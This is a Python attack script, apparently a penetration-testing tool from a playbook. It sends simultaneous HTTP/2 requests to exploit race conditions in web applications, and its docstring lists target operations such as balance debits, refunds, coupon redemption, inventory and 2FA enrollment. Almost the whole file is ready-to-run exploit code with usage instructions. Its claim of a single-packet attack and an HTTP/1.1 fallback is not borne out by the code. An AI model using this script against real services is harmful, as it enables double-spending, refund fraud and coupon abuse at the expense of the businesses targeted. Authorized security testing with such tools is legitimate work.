#!/usr/bin/env python3
"""
race-balance.py — Race-condition tester (HTTP/2 single-packet attack).

Used in playbook 10 §10.4.

Sends N identical requests as close to simultaneously as possible
to expose check-then-act races. Uses HTTP/2 single-packet attack
(buffering N HEADERS frames in one TCP write) when supported, falling
back to threaded HTTP/1.1 otherwise.

Common targets:
  - Balance debit (place orders concurrently when balance allows
    only one).
  - Refund (refund same order from two requests).
  - Coupon redemption (use same coupon twice).
  - Vote / like (count goes above intended).
  - Inventory decrement (buy more than stock).
  - 2FA enable (enroll with two secrets).

Usage:
  ./race-balance.py \\
    --url 'https://target.example/api/v2/orders/place' \\
    --method POST \\
    --header 'Cookie: sid=...' \\
    --header 'Content-Type: application/json' \\
    --body '{"service_id":1,"qty":1}' \\
    --concurrency 20

Output: status code distribution and per-response identifying
fields. Anomalies (e.g., 2+ "200 OK with order_id N") indicate the
race produced more outcomes than intended.

Prerequisites:
  pip install httpx[http2]

Limitations:
  - Single-packet attack works best on direct HTTP/2 origins.
  - Some CDNs and proxies serialize requests; effectiveness varies.
"""

import argparse
import asyncio
import json
import sys
import time

try:
    import httpx
except ImportError:
    print("requires: pip install httpx[http2]", file=sys.stderr)
    sys.exit(1)


async def fire(client, args, idx):
    """Fire a single request and capture the result."""
    headers = {}
    for h in args.header or []:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    try:
        t0 = time.perf_counter()
        if args.method.upper() == "GET":
            r = await client.get(args.url, headers=headers)
        else:
            data = args.body if args.body else None
            r = await client.request(args.method, args.url,
                                     content=data, headers=headers)
        elapsed = (time.perf_counter() - t0) * 1000.0
        body = r.text[:300]
        return {
            "idx": idx,
            "status": r.status_code,
            "elapsed_ms": elapsed,
            "body": body,
        }
    except Exception as e:
        return {
            "idx": idx,
            "status": -1,
            "elapsed_ms": -1,
            "body": f"ERR: {e.__class__.__name__}: {e}",
        }


async def run_race(args):
    """Open one HTTP/2 connection, fire N requests concurrently."""
    limits = httpx.Limits(max_connections=1, max_keepalive_connections=1)
    timeout = httpx.Timeout(args.timeout)

    async with httpx.AsyncClient(http2=True, limits=limits, timeout=timeout,
                                  verify=not args.insecure) as client:
        # Warm up the connection (negotiate TLS + HTTP/2)
        try:
            await client.get(args.warmup_url or args.url,
                             headers={"User-Agent": "OBSIDIAN-warmup"})
        except Exception:
            pass

        # Fire all at once
        print(f"firing {args.concurrency} concurrent requests...")
        t0 = time.perf_counter()
        tasks = [fire(client, args, i) for i in range(args.concurrency)]
        results = await asyncio.gather(*tasks)
        total = (time.perf_counter() - t0) * 1000.0
        print(f"all done in {total:.1f}ms")
        return results


def summarize(results):
    """Group results and highlight anomalies."""
    statuses = {}
    bodies = {}
    for r in results:
        statuses.setdefault(r["status"], []).append(r["idx"])
        # Group by first 100 chars of body
        body_key = r["body"][:100] if r["body"] else "<empty>"
        bodies.setdefault(body_key, []).append(r["idx"])

    print(f"\n=== status code distribution ===")
    for s, ids in sorted(statuses.items()):
        print(f"  {s}: {len(ids)} requests {'idx=' + str(ids) if len(ids) <= 5 else ''}")

    print(f"\n=== response body groupings ===")
    for body, ids in sorted(bodies.items(), key=lambda x: -len(x[1])):
        print(f"  ({len(ids):>2}x) idx={ids if len(ids) <= 5 else ids[:3] + ['...']}")
        print(f"      body: {body[:120]}")

    # If multiple 200s with different bodies, race likely succeeded
    success_results = [r for r in results if 200 <= r["status"] < 300]
    distinct_bodies = set(r["body"][:200] for r in success_results)
    if len(success_results) >= 2 and len(distinct_bodies) >= 2:
        print(f"\n!! POSSIBLE RACE WIN: {len(success_results)} 2xx responses "
              f"with {len(distinct_bodies)} distinct bodies")
        print("   This suggests multiple operations succeeded concurrently.")
        print("   Investigate whether the check-then-act invariant was violated.")
    elif len(success_results) >= 2:
        print(f"\n   {len(success_results)} 2xx responses, but bodies match.")
        print("   May indicate idempotency, deduplication, or that the race")
        print("   didn't trigger this run. Try increasing --concurrency.")


def main():
    p = argparse.ArgumentParser(description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--url", required=True)
    p.add_argument("--method", default="POST")
    p.add_argument("--header", action="append")
    p.add_argument("--body", default=None)
    p.add_argument("--body-json", default=None,
        help="alias for --body but auto-add Content-Type: application/json")
    p.add_argument("--concurrency", type=int, default=20)
    p.add_argument("--timeout", type=float, default=30.0)
    p.add_argument("--insecure", action="store_true")
    p.add_argument("--warmup-url", default=None,
        help="URL to warm up the connection (defaults to --url with GET)")
    args = p.parse_args()

    if args.body_json:
        args.body = args.body_json
        args.header = (args.header or []) + ["Content-Type: application/json"]

    results = asyncio.run(run_race(args))
    summarize(results)


if __name__ == "__main__":
    main()
